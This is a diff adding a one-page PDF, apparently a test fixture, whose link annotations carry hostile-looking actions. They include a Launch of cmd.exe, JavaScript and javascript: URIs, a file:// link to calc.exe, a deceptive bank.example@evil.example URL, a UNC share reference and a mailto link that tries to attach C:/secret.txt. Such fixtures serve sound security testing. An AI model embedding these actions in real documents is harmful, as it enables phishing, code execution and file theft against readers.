@@ -1,0 +1,104 @@
+%PDF-1.7
+%‚„œ”
+1 0 obj
+<< /Type /Catalog /Pages 2 0 R  >>
+endobj
+2 0 obj
+<< /Type /Pages /Kids [10 0 R] /Count 1 >>
+endobj
+3 0 obj
+<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica /Encoding /WinAnsiEncoding >>
+endobj
+4 0 obj
+<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica /Encoding /WinAnsiEncoding /ToUnicode 5 0 R >>
+endobj
+5 0 obj
+<<  /Length 335 >>
+stream
+/CIDInit /ProcSet findresource begin 12 dict begin begincmap
+/CIDSystemInfo << /Registry (Adobe) /Ordering (UCS) /Supplement 0 >> def
+/CMapName /Adobe-Identity-UCS def /CMapType 2 def
+1 begincodespacerange <00> <FF> endcodespacerange
+1 beginbfchar <41> <D83DDE00> endbfchar
+endcmap CMapName currentdict /CMap defineresource pop end end
+endstream
+endobj
+10 0 obj
+<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Annots [30 0 R 31 0 R 32 0 R 33 0 R 34 0 R 35 0 R 36 0 R 37 0 R] /Contents 11 0 R /Resources << /Font << /F1 3 0 R /F2 4 0 R >> >> >>
+endobj
+11 0 obj
+<<  /Length 37 >>
+stream
+BT /F1 18 Tf 72 700 Td (links) Tj ET
+
+endstream
+endobj
+30 0 obj
+<< /Type /Annot /Subtype /Link /Rect [10 10 100 40] /Border [0 0 0] /A << /S /URI /URI (file:///C:/Windows/System32/calc.exe) >> >>
+endobj
+31 0 obj
+<< /Type /Annot /Subtype /Link /Rect [10 50 100 80] /Border [0 0 0] /A << /S /URI /URI (javascript:alert(1)) >> >>
+endobj
+32 0 obj
+<< /Type /Annot /Subtype /Link /Rect [10 90 100 120] /Border [0 0 0] /A << /S /Launch /F (cmd.exe) /Win << /F (cmd.exe) /P (/c calc) >> >> >>
+endobj
+33 0 obj
+<< /Type /Annot /Subtype /Link /Rect [10 130 100 160] /Border [0 0 0] /A << /S /URI /URI (https://bank.example@evil.example/) >> >>
+endobj
+34 0 obj
+<< /Type /Annot /Subtype /Link /Rect [10 170 100 200] /Border [0 0 0] /A << /S /JavaScript /JS (app.alert(1)) >> >>
+endobj
+35 0 obj
+<< /Type /Annot /Subtype /Link /Rect [10 210 100 240] /Border [0 0 0] /A << /S /GoToR /F (\\\\server\\share\\x.pdf) /D [0 /Fit] >> >>
+endobj
+36 0 obj
+<< /Type /Annot /Subtype /Link /Rect [10 250 100 280] /Border [0 0 0] /A << /S /URI /URI 12345 >> >>
+endobj
+37 0 obj
+<< /Type /Annot /Subtype /Link /Rect [10 290 100 320] /Border [0 0 0] /A << /S /URI /URI (mailto:a@b.example?attach=C:/secret.txt) >> >>
+endobj
+xref
+0 38
+0000000000 65535 f 
+0000000015 00000 n 
+0000000065 00000 n 
+0000000123 00000 n 
+0000000220 00000 n 
+0000000334 00000 n 
+0000000000 65535 f 
+0000000000 65535 f 
+0000000000 65535 f 
+0000000000 65535 f 
+0000000721 00000 n 
+0000000925 00000 n 
+0000000000 65535 f 
+0000000000 65535 f 
+0000000000 65535 f 
+0000000000 65535 f 
+0000000000 65535 f 
+0000000000 65535 f 
+0000000000 65535 f 
+0000000000 65535 f 
+0000000000 65535 f 
+0000000000 65535 f 
+0000000000 65535 f 
+0000000000 65535 f 
+0000000000 65535 f 
+0000000000 65535 f 
+0000000000 65535 f 
+0000000000 65535 f 
+0000000000 65535 f 
+0000000000 65535 f 
+0000001014 00000 n 
+0000001162 00000 n 
+0000001293 00000 n 
+0000001451 00000 n 
+0000001599 00000 n 
+0000001731 00000 n 
+0000001881 00000 n 
+0000001998 00000 n 
+trailer
+<< /Size 38 /Root 1 0 R  >>
+startxref
+2151
+%%EOF
